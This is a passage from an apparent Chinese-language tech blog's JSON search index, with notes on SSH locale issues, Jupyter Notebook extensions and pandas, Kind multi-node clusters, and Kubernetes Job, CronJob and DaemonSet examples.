target=\"_blank\" rel=\"noopener\">牙根 會痛 假牙 - Google 搜尋</a></li>\n<li><a href=\"https://www.google.com/search?q=shell+ssh+command&amp;client=firefox-b-d&amp;sxsrf=ALeKk01FDso58ld-3nJS1BtA0NDR-ZEJ8Q:1595611007298&amp;ei=fxcbX9jZEY2Ur7wPlcuRmAc&amp;start=20&amp;sa=N&amp;ved=2ahUKEwiYlaiasubqAhUNyosBHZVlBHM4ChDw0wN6BAgOEEM&amp;biw=1280&amp;bih=644\" target=\"_blank\" rel=\"noopener\">shell ssh command - Google 搜尋</a></li>\n<li><a href=\"https://zaiste.net/posts/few-ways-to-execute-commands-remotely-ssh/\" target=\"_blank\" rel=\"noopener\">A few ways to execute commands remotely using SSH · zaiste.net</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-d&amp;biw=1280&amp;bih=644&amp;sxsrf=ALeKk016alYo2SrL6mJ7XnrDFEqsqx4--w%3A1595611426430&amp;ei=IhkbX8zrGf-Ur7wPiIq5gAo&amp;q=ssh+%E9%81%A0%E7%AB%AF+%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F+log+%E4%BA%82%E7%A2%BC+lang&amp;oq=ssh+%E9%81%A0%E7%AB%AF+%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F+log+%E4%BA%82%E7%A2%BC+lang&amp;gs_lcp=CgZwc3ktYWIQAzIFCAAQzQI6BwgjELADECc6BAgjECdQ3D9YsEtgxExoAnAAeACAAU2IAacDkgEBN5gBAKABAaoBB2d3cy13aXrAAQE&amp;sclient=psy-ab&amp;ved=0ahUKEwjMhJbis-bqAhV_yosBHQhFDqA4ChDh1QMICw&amp;uact=5\" target=\"_blank\" rel=\"noopener\">ssh 遠端 執行程式 log 亂碼 lang - Google 搜尋</a></li>\n<li><a href=\"https://www.itread01.com/content/1496132534.html\" target=\"_blank\" rel=\"noopener\">SSH訪問linux 亂碼問題 - IT閱讀</a></li>\n<li><a href=\"http://www.csjs.tc.edu.tw/lt/index.php?op=ViewArticle&amp;articleId=528&amp;blogId=5\" target=\"_blank\" rel=\"noopener\">清水國中資訊組 | locale語系設定UTF-8與Big5</a></li>\n<li><a href=\"https://www.mxp.tw/5421/\" target=\"_blank\" rel=\"noopener\">解決遠端 SSH 連線主機時文字編碼設定 locale 錯亂問題 | 一介資男</a></li>\n<li><a href=\"https://zh.it-reply.net/q/%E5%A6%82%E4%BD%95%E5%BE%9E-ssh-config%E7%A6%81%E7%94%A8sshconfig%E4%B8%AD%E8%A8%AD%E7%BD%AE%E7%9A%84sendenv%E8%AE%8A%E9%87%8F-4795\" target=\"_blank\" rel=\"noopener\">[ssh] — 如何從〜/ .ssh / config禁用ssh_config中設置的SendEnv變量</a></li>\n<li><a href=\"https://yulun.me/2016/ssh-remote-sendenv-locale-issue/\" target=\"_blank\" rel=\"noopener\">關閉 SSH SendENV 解決 locale 問題 | Somewhere I Belong</a></li>\n<li><a href=\"https://chusiang.gitbooks.io/working-on-gnu-linux/content/20.ssh_config.html\" target=\"_blank\" rel=\"noopener\">增進 SSH 使用效率 - ssh_config · 完全用 GNU/Linux 工作</a></li>\n<li><a href=\"https://www.google.com/search?q=SendEnv++jenkins+ssh+%E4%BA%82%E7%A2%BC&amp;client=firefox-b-d&amp;sxsrf=ALeKk02NHeZqOFBICu1lc9oM33eKuEKtLg:1595612479397&amp;ei=Px0bX_vfF4eTr7wPhZq5gAI&amp;start=10&amp;sa=N&amp;ved=2ahUKEwi7-6HYt-bqAhWHyYsBHQVNDiAQ8NMDegQIDBBD&amp;biw=1280&amp;bih=620\" target=\"_blank\" rel=\"noopener\">SendEnv jenkins ssh 亂碼 - Google 搜尋</a></li>\n<li><a href=\"https://my.oschina.net/sunlimiter/blog/877025\" target=\"_blank\" rel=\"noopener\">jenkins 节点主机在不同系统导致乱码的解决办法 - 花花兽的个人页面 - OSCHINA</a></li>\n<li><a href=\"https://blog.miniasp.com/post/2015/12/24/Jenkins-on-Windows-03-Avoid-messy-words-in-log-messages\" target=\"_blank\" rel=\"noopener\">Jenkins on Windows 心得分享 (03)：有效避免記錄檔或訊息出現亂碼的方法 | The Will Will Web</a></li>\n<li><a href=\"https://blog.csdn.net/ZZY1078689276/article/details/77839045\" target=\"_blank\" rel=\"noopener\">Jenkins之解决乱码问题_ZZY1078689276的专栏-CSDN博客_jenkins utf-8 文件乱码</a></li>\n<li><a href=\"https://www.ancii.com/asceau5ym/\" target=\"_blank\" rel=\"noopener\">【转】ssh 中文乱码问题_安科网</a></li>\n</ul>\n","categories":["Linux"],"tags":["linux","java"]},{"title":"Jupyter Notebook 使用初體驗","url":"/blog/2019/08/30/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>最近看到有人拿 Jupyter 做筆記<br>之前都不知清楚有什麼作用<br>不過有看到有人拿來做一些程式筆記<br>裡面也可以寫 Markdown 文件<br>今天就來安裝玩玩</p>\n<a id=\"more\"></a>\n<h2 id=\"anaconda\"><a href=\"#anaconda\" class=\"headerlink\" title=\"anaconda\"></a>anaconda</h2><p>裡面包含 Jupyter Notebook ,pandas….<br>所以我選擇安裝這個<br>快速完成環境</p>\n<p>PS: Apache Zeppelin 也有類似的功能</p>\n<h2 id=\"安裝套件\"><a href=\"#安裝套件\" class=\"headerlink\" title=\"安裝套件\"></a>安裝套件</h2><p><a href=\"https://www.zhihu.com/question/46309360\" target=\"_blank\" rel=\"noopener\">jupyter notebook 可以做哪些事情？ - 知乎</a></p>\n<h3 id=\"Snippets\"><a href=\"#Snippets\" class=\"headerlink\" title=\"Snippets\"></a>Snippets</h3><p>因為 python 不熟，安裝這個可以快速使用</p>\n<h4 id=\"安裝方法\"><a href=\"#安裝方法\" class=\"headerlink\" title=\"安裝方法\"></a>安裝方法</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> git://github.com/moble/jupyter_boilerplate</span><br><span class=\"line\">jupyter nbextension install jupyter_boilerplate</span><br><span class=\"line\">jupyter nbextension <span class=\"built_in\">enable</span> jupyter_boilerplate/main</span><br></pre></td></tr></table></figure>\n<h3 id=\"自動補字\"><a href=\"#自動補字\" class=\"headerlink\" title=\"自動補字\"></a>自動補字</h3><h4 id=\"安裝方法-1\"><a href=\"#安裝方法-1\" class=\"headerlink\" title=\"安裝方法\"></a>安裝方法</h4><p><strong>安裝前記得要先把 jupyter 關掉!!!!</strong></p>\n<blockquote>\n<p>安裝<br>如果之前安裝過顯示目錄功能的話，這一步驟可以跳過。<br>pip install jupyter_contrib_nbextensions<br>配置<br>安裝完之後需要配置 nbextension，注意配置的時候要確保已關閉 Jupyter Notebook：<br>jupyter contrib nbextension install –user –skip-running-check<br>啟動 Jupyter Notebook，勾選設置<br>上面兩個步驟都沒報錯後，啟動 Jupyter Notebook，上面選項欄會出現 Nbextensions 的選項<br>作者：caoqi95<br>链接：<a href=\"https://www.jianshu.com/p/0ab80f63af8a\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/0ab80f63af8a</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>\n</blockquote>\n<p><a href=\"https://www.jianshu.com/p/0ab80f63af8a\" target=\"_blank\" rel=\"noopener\">Jupyter Notebook 添加代码自动补全功能 - 简书</a></p>\n<h2 id=\"csv-轉-xlsx\"><a href=\"#csv-轉-xlsx\" class=\"headerlink\" title=\"csv 轉 xlsx\"></a>csv 轉 xlsx</h2><p>pandas 可以方便做很多東西<br>例如資料轉換格式<br>真的非常方便許多</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> print_function, division</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"></span><br><span class=\"line\">bp_data = pd.read_csv(<span class=\"string\">\"FL_insurance_sample.csv\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bp_data.to_excel(<span class=\"string\">'test.xlsx'</span>,index=<span class=\"keyword\">False</span>)</span><br></pre></td></tr></table></figure>\n<a href=\"/blog/2019/08/30/Jupyter-Notebook-使用初體驗/csv轉xlsx.ipynb\" title=\"ipynb檔案\">ipynb檔案</a>\n<p>參考範例:<a href=\"https://blog.csdn.net/brucewong0516/article/details/79097909\" target=\"_blank\" rel=\"noopener\">【python】pandas库pd.to_excel操作写入excel文件参数整理与实例 - brucewong0516的博客 - CSDN博客</a><br><a href=\"https://support.spatialkey.com/spatialkey-sample-csv-data/\" target=\"_blank\" rel=\"noopener\">Sample CSV Data – SpatialKey Support</a><br>csv來源從這邊來</p>\n<h2 id=\"pandas-一些應用\"><a href=\"#pandas-一些應用\" class=\"headerlink\" title=\"pandas 一些應用\"></a>pandas 一些應用</h2><p>可以抓取重複資料，但不知道大檔案處理速度不知道能不能負荷</p>\n<p><a href=\"https://www.jianshu.com/p/c033f89f4750\" target=\"_blank\" rel=\"noopener\">pandas使用技巧【18】找到和移除重复行 - 简书</a><br><a href=\"https://www.itread01.com/content/1541375289.html\" target=\"_blank\" rel=\"noopener\">資料處理：用pandas處理大型csv檔案 - IT閱讀</a><br><a href=\"https://blog.csdn.net/u010665216/article/details/78559091\" target=\"_blank\" rel=\"noopener\">Pandas之drop_duplicates：去除重复项 - OraYang的博客 - CSDN博客</a><br><a href=\"https://stackoverflow.com/questions/29938613/how-to-transform-pandas-dataframe-for-insertion-via-executemany-statement\" target=\"_blank\" rel=\"noopener\">python - how to transform pandas dataframe for insertion via executemany() statement? - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/41650188/how-to-write-python-sql-output-into-csv-using-a-dataframe\" target=\"_blank\" rel=\"noopener\">How to write python sql output into CSV using a dataframe - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/36431213/sql-statement-for-csv-files-on-ipython-notebook\" target=\"_blank\" rel=\"noopener\">python - SQL statement for CSV files on IPython notebook - Stack Overflow</a><br><a href=\"https://zhuanlan.zhihu.com/p/32600329\" target=\"_blank\" rel=\"noopener\">【精心解读】关于Jupyter Notebook的28个技巧 - 知乎</a></p>\n<p>類似 SQL 應用<br><a href=\"https://medium.com/jbennetcodes/how-to-rewrite-your-sql-queries-in-pandas-and-more-149d341fc53e\" target=\"_blank\" rel=\"noopener\">How to rewrite your SQL queries in Pandas, and more</a></p>\n<p><a href=\"https://stackoverflow.com/questions/51824732/removing-duplicates-between-multiple-large-csv-files\" target=\"_blank\" rel=\"noopener\">python 3.x - Removing duplicates between multiple large CSV files - Stack Overflow</a></p>\n<p>常常有時候會收到一些 Excel 要產生 SQL 語句<br>但是看一下內建to_sql<br>好像直接對csv匯入…<br>可能還是需要用<br>有機會應用在補充</p>\n<h2 id=\"連-Oracle\"><a href=\"#連-Oracle\" class=\"headerlink\" title=\"連 Oracle\"></a>連 Oracle</h2><p><a href=\"http://chingchuan-chen.github.io/posts/201607/2016-07-26-use-cx_Oracle-to-manipulate-oracle-database-in-Python.html\" target=\"_blank\" rel=\"noopener\">在Python用cx_Oracle去操作Oracle資料庫 | Ching-Chuan Chen’s Blogger</a></p>\n","categories":["實用工具"],"tags":["jupyter"]},{"title":"Kind 建置 Cluster","url":"/blog/2021/02/18/Kind-%E5%BB%BA%E7%BD%AE-Cluster/","content":"<p>最近看 Kuberenets 看到 DaemonSet<br>由於目前 Kind 跟 MiniKube 都是使用單結點<br>沒有用 Cluster<br>今天照 Kind 實作看看</p>\n<a id=\"more\"></a>\n<h2 id=\"建置-Cluster\"><a href=\"#建置-Cluster\" class=\"headerlink\" title=\"建置 Cluster\"></a>建置 Cluster</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 預設 cluster context 名稱為 `kind`.</span></span><br><span class=\"line\">kind create cluster </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 名稱為 kind-2</span></span><br><span class=\"line\">kind create cluster --name kind-2</span><br></pre></td></tr></table></figure>\n<p>這邊建立出來會有兩個 Cluster<br>但這兩個 Cluster 是分開的</p>\n<p>等等，我不是要分開的</p>\n<h2 id=\"查看哪些-Cluster\"><a href=\"#查看哪些-Cluster\" class=\"headerlink\" title=\"查看哪些 Cluster\"></a>查看哪些 Cluster</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind get clusters</span><br><span class=\"line\"><span class=\"comment\"># kind</span></span><br><span class=\"line\"><span class=\"comment\"># kind-2</span></span><br><span class=\"line\">kubectl cluster-info --context kind-kind</span><br><span class=\"line\">kubectl cluster-info --context kind-kind-2</span><br></pre></td></tr></table></figure>\n<p>等等，我不是要分開的</p>\n<h2 id=\"刪除-Cluster\"><a href=\"#刪除-Cluster\" class=\"headerlink\" title=\"刪除 Cluster\"></a>刪除 Cluster</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind delete cluster --name kind-2</span><br></pre></td></tr></table></figure>\n<h2 id=\"Multi-node-clusters\"><a href=\"#Multi-node-clusters\" class=\"headerlink\" title=\"Multi-node clusters\"></a>Multi-node clusters</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># three node (two workers) cluster config</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Cluster</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">kind.x-k8s.io/v1alpha4</span></span><br><span class=\"line\"><span class=\"attr\">nodes:</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">worker</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">worker</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Cluster</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">kind.x-k8s.io/v1alpha4</span></span><br><span class=\"line\"><span class=\"attr\">nodes:</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">worker</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">worker</span></span><br><span class=\"line\"><span class=\"attr\">- role:</span> <span class=\"string\">worker</span></span><br></pre></td></tr></table></figure>\n<p>上面 yml 選一個跑</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind create cluster --config kind-example-config.yaml</span><br></pre></td></tr></table></figure>\n<p>建立這麼簡單<br>感覺跟 Docker Swarm 一樣</p>\n<p>我以為要注意在連 Cluster 看當下 node 有哪些 container<br>看來全部都合起來了</p>\n<p>看完，真的是白擔心了<br>真的可以單結點來測試</p>\n<p>不過，DaemonSet 好像能控制在哪個 nodes 執行<br>建立 Cluster 多 node 也不錯</p>\n<p><strong>發現重開機，kubectl 就會連不到</strong><br>所以，應該只能重建</p>\n","categories":["Kuberenetes"],"tags":["Kubernetes"]},{"title":"Kubernetes 的 Job","url":"/blog/2021/02/22/Kuberenetes-%E7%9A%84-Job/","content":"<p>直接進入重點</p>\n<a id=\"more\"></a>\n<h2 id=\"官方實例\"><a href=\"#官方實例\" class=\"headerlink\" title=\"官方實例\"></a>官方實例</h2><figure class=\"highlight yml\"><figcaption><span>job.yaml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">batch/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Job</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">pi</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      containers:</span></span><br><span class=\"line\"><span class=\"attr\">      - name:</span> <span class=\"string\">pi</span></span><br><span class=\"line\"><span class=\"attr\">        image:</span> <span class=\"string\">perl</span></span><br><span class=\"line\"><span class=\"attr\">        command:</span> <span class=\"string\">[\"perl\",</span>  <span class=\"string\">\"-Mbignum=bpi\"</span><span class=\"string\">,</span> <span class=\"string\">\"-wle\"</span><span class=\"string\">,</span> <span class=\"string\">\"print bpi(2000)\"</span><span class=\"string\">]</span></span><br><span class=\"line\"><span class=\"attr\">      restartPolicy:</span> <span class=\"string\">Never</span></span><br><span class=\"line\"><span class=\"attr\">  backoffLimit:</span> <span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://kubernetes.io/examples/controllers/job.yaml</span><br></pre></td></tr></table></figure>\n<h2 id=\"自動清理\"><a href=\"#自動清理\" class=\"headerlink\" title=\"自動清理\"></a>自動清理</h2><p>完成 100 秒就會清除，我在 kind 沒有效果…</p>\n<blockquote>\n<p>FEATURE STATE: Kubernetes v1.12 [alpha]</p>\n</blockquote>\n<p>可能我的環境還不支援??</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apiVersion: batch/v1</span><br><span class=\"line\">kind: Job</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: pi-with-ttl</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  ttlSecondsAfterFinished: 100</span><br><span class=\"line\">  template:</span><br><span class=\"line\">    spec:</span><br><span class=\"line\">      containers:</span><br><span class=\"line\">      - name: pi</span><br><span class=\"line\">        image: perl</span><br><span class=\"line\">        <span class=\"built_in\">command</span>: [<span class=\"string\">\"perl\"</span>,  <span class=\"string\">\"-Mbignum=bpi\"</span>, <span class=\"string\">\"-wle\"</span>, <span class=\"string\">\"print bpi(2000)\"</span>]</span><br><span class=\"line\">      restartPolicy: Never</span><br></pre></td></tr></table></figure>\n<h2 id=\"Crontab\"><a href=\"#Crontab\" class=\"headerlink\" title=\"Crontab\"></a>Crontab</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">batch/v1beta1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">CronJob</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">hello</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  schedule:</span> <span class=\"string\">\"*/1 * * * *\"</span></span><br><span class=\"line\"><span class=\"attr\">  jobTemplate:</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      template:</span></span><br><span class=\"line\"><span class=\"attr\">        spec:</span></span><br><span class=\"line\"><span class=\"attr\">          containers:</span></span><br><span class=\"line\"><span class=\"attr\">          - name:</span> <span class=\"string\">hello</span></span><br><span class=\"line\"><span class=\"attr\">            image:</span> <span class=\"string\">busybox</span></span><br><span class=\"line\"><span class=\"attr\">            imagePullPolicy:</span> <span class=\"string\">IfNotPresent</span></span><br><span class=\"line\"><span class=\"attr\">            args:</span></span><br><span class=\"line\"><span class=\"bullet\">            -</span> <span class=\"string\">/bin/sh</span></span><br><span class=\"line\"><span class=\"bullet\">            -</span> <span class=\"bullet\">-c</span></span><br><span class=\"line\"><span class=\"bullet\">            -</span> <span class=\"string\">date;</span> <span class=\"string\">echo</span> <span class=\"string\">Hello</span> <span class=\"string\">from</span> <span class=\"string\">the</span> <span class=\"string\">Kubernetes</span> <span class=\"string\">cluster</span></span><br><span class=\"line\"><span class=\"attr\">          restartPolicy:</span> <span class=\"string\">OnFailure</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Queue-Work\"><a href=\"#Queue-Work\" class=\"headerlink\" title=\"Queue Work\"></a>Queue Work</h2><ul>\n<li><a href=\"https://kubernetes.io/zh/docs/tasks/job/coarse-parallel-processing-work-queue/\" target=\"_blank\" rel=\"noopener\">使用工作队列进行粗粒度并行处理 | Kubernetes</a></li>\n<li><a href=\"https://draveness.me/kubernetes-job-cronjob/\" target=\"_blank\" rel=\"noopener\">详解 Kubernetes Job 和 CronJob 的实现原理 - 面向信仰编程</a></li>\n</ul>\n","categories":["Kubernetes"],"tags":["kubernetes","job"]},{"title":"Kubernetes 的 DaemonSet","url":"/blog/2021/02/18/Kuberentes-%E7%9A%84-DaemonSet/","content":"<p>Deployment 和 ReplicaSet 通常使用多個 replica 時候，都是建在各 nodes 隨機安裝。<br>DaemonSet 可以讓每一台 node 運行 Pod。<br>感覺這個跟 docker swarm 的 agent mode :global  一樣 <a href=\"https://malagege.github.io/blog/2019/12/07/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/\">docker swarm 一些指令相關整理 | 程式狂想筆記</a><br>立馬實作看看</p>\n<a id=\"more\"></a>\n<h2 id=\"DaemonSet\"><a href=\"#DaemonSet\" class=\"headerlink\" title=\"DaemonSet\"></a>DaemonSet</h2><p>使用 DaemonSet 會在所有 node 建立 Pod。如先前所講，跟 Docker Swarm 很像的 agent mode :global 很像<br>也可以針對 nodename 來建立 Pod。</p>\n<h2 id=\"建立-DaemonSet\"><a href=\"#建立-DaemonSet\" class=\"headerlink\" title=\"建立 DaemonSet\"></a>建立 DaemonSet</h2><p><a href=\"https://github.com/kubernetes-up-and-running/examples/blob/master/9-1-fluentd.yaml\" target=\"_blank\" rel=\"noopener\">examples/9-1-fluentd.yaml at master · kubernetes-up-and-running/examples</a></p>\n<p>這邊版本太舊<br>no matches for kind “DaemonSet” in version “extensions/v1beta1<br><a href=\"https://github.com/gluster/gluster-kubernetes/issues/627\" target=\"_blank\" rel=\"noopener\">no matches for kind “DaemonSet” in version “extensions/v1beta1” · Issue #627 · gluster/gluster-kubernetes</a></p>\n<blockquote>\n<p>notes:</p>\n<pre><code>changed apiVersion to &quot;apps/v1&quot;\nadded selector\n</code></pre></blockquote>\n<p>最後還是套用官方文件<a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/\" target=\"_blank\" rel=\"noopener\">DaemonSet | Kubernetes</a></p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">DaemonSet</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"attr\">  namespace:</span> <span class=\"string\">kube-system</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    k8s-app:</span> <span class=\"string\">fluentd-logging</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    matchLabels:</span></span><br><span class=\"line\"><span class=\"attr\">      name:</span> <span class=\"string\">fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span></span><br><span class=\"line\"><span class=\"attr\">    metadata:</span></span><br><span class=\"line\"><span class=\"attr\">      labels:</span></span><br><span class=\"line\"><span class=\"attr\">        name:</span> <span class=\"string\">fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      tolerations:</span></span><br><span class=\"line\">      <span class=\"comment\"># this toleration is to have the daemonset runnable on master nodes</span></span><br><span class=\"line\">      <span class=\"comment\"># remove it if your masters can't run pods</span></span><br><span class=\"line\"><span class=\"attr\">      - key:</span> <span class=\"string\">node-role.kubernetes.io/master</span></span><br><span class=\"line\"><span class=\"attr\">        effect:</span> <span class=\"string\">NoSchedule</span></span><br><span class=\"line\"><span class=\"attr\">      containers:</span></span><br><span class=\"line\"><span class=\"attr\">      - name:</span> <span class=\"string\">fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"attr\">        image:</span> <span class=\"string\">quay.io/fluentd_elasticsearch/fluentd:v2.5.2</span></span><br><span class=\"line\"><span class=\"attr\">        resources:</span></span><br><span class=\"line\"><span class=\"attr\">          limits:</span></span><br><span class=\"line\"><span class=\"attr\">            memory:</span> <span class=\"number\">200</span><span class=\"string\">Mi</span></span><br><span class=\"line\"><span class=\"attr\">          requests:</span></span><br><span class=\"line\"><span class=\"attr\">            cpu:</span> <span class=\"number\">100</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">            memory:</span> <span class=\"number\">200</span><span class=\"string\">Mi</span></span><br><span class=\"line\"><span class=\"attr\">        volumeMounts:</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">varlog</span></span><br><span class=\"line\"><span class=\"attr\">          mountPath:</span> <span class=\"string\">/var/log</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">varlibdockercontainers</span></span><br><span class=\"line\"><span class=\"attr\">          mountPath:</span> <span class=\"string\">/var/lib/docker/containers</span></span><br><span class=\"line\"><span class=\"attr\">          readOnly:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">      terminationGracePeriodSeconds:</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attr\">      volumes:</span></span><br><span class=\"line\"><span class=\"attr\">      - name:</span> <span class=\"string\">varlog</span></span><br><span class=\"line\"><span class=\"attr\">        hostPath:</span></span><br><span class=\"line\"><span class=\"attr\">          path:</span> <span class=\"string\">/var/log</span></span><br><span class=\"line\"><span class=\"attr\">      - name:</span> <span class=\"string\">varlibdockercontainers</span></span><br><span class=\"line\"><span class=\"attr\">        hostPath:</span></span><br><span class=\"line\"><span class=\"attr\">          path:</span> <span class=\"string\">/var/lib/docker/containers</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://k8s.io/examples/controllers/daemonset.yaml</span><br></pre></td></tr></table></figure>\n<p>查看狀況，這邊namespace 要調整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl describe daemonsets fluentd-elasticsearch --namespace kube-system</span><br><span class=\"line\"><span class=\"comment\"># Name:           fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"comment\"># Selector:       name=fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"comment\"># Node-Selector:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Labels:         k8s-app=fluentd-logging</span></span><br><span class=\"line\"><span class=\"comment\"># Annotations:    deprecated.daemonset.template.generation: 1</span></span><br><span class=\"line\"><span class=\"comment\"># Desired Number of Nodes Scheduled: 6</span></span><br><span class=\"line\"><span class=\"comment\"># Current Number of Nodes Scheduled: 6</span></span><br><span class=\"line\"><span class=\"comment\"># Number of Nodes Scheduled with Up-to-date Pods: 6</span></span><br><span class=\"line\"><span class=\"comment\"># Number of Nodes Scheduled with Available Pods: 6</span></span><br><span class=\"line\"><span class=\"comment\"># Number of Nodes Misscheduled: 0</span></span><br><span class=\"line\"><span class=\"comment\"># Pods Status:  6 Running / 0 Waiting / 0 Succeeded / 0 Failed</span></span><br><span class=\"line\"><span class=\"comment\"># Pod Template:</span></span><br><span class=\"line\"><span class=\"comment\">#   Labels:  name=fluentd-elasticsearch</span></span><br><span class=\"line\"><span class=\"comment\">#   Containers:</span></span><br><span class=\"line\"><span class=\"comment\">#    fluentd-elasticsearch:</span></span><br><span class=\"line\"><span class=\"comment\">#     Image:      quay.io/fluentd_elasticsearch/fluentd:v2.5.2</span></span><br><span class=\"line\"><span class=\"comment\">#     Port:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Host Port:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Limits:</span></span><br><span class=\"line\"><span class=\"comment\">#       memory:  200Mi</span></span><br><span class=\"line\"><span class=\"comment\">#     Requests:</span></span><br><span class=\"line\"><span class=\"comment\">#       cpu:        100m</span></span><br><span class=\"line\"><span class=\"comment\">#       memory:     200Mi</span></span><br><span class=\"line\"><span class=\"comment\">#     Environment:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Mounts:</span></span><br><span class=\"line\"><span class=\"comment\">#       /var/lib/docker/containers from varlibdockercontainers (ro)</span></span><br><span class=\"line\"><span class=\"comment\">#       /var/log from varlog (rw)</span></span><br><span class=\"line\"><span class=\"comment\">#   Volumes:</span></span><br><span class=\"line\"><span class=\"comment\">#    varlog:</span></span><br><span class=\"line\"><span class=\"comment\">#     Type:          HostPath (bare host directory volume)</span></span><br><span class=\"line\"><span class=\"comment\">#     Path:          /var/log</span></span><br><span class=\"line\"><span class=\"comment\">#     HostPathType:  </span></span><br><span class=\"line\"><span class=\"comment\">#    varlibdockercontainers:</span></span><br><span class=\"line\"><span class=\"comment\">#     Type:          HostPath (bare host directory volume)</span></span><br><span class=\"line\"><span class=\"comment\">#     Path:          /var/lib/docker/containers</span></span><br><span class=\"line\"><span class=\"comment\">#     HostPathType:  </span></span><br><span class=\"line\"><span 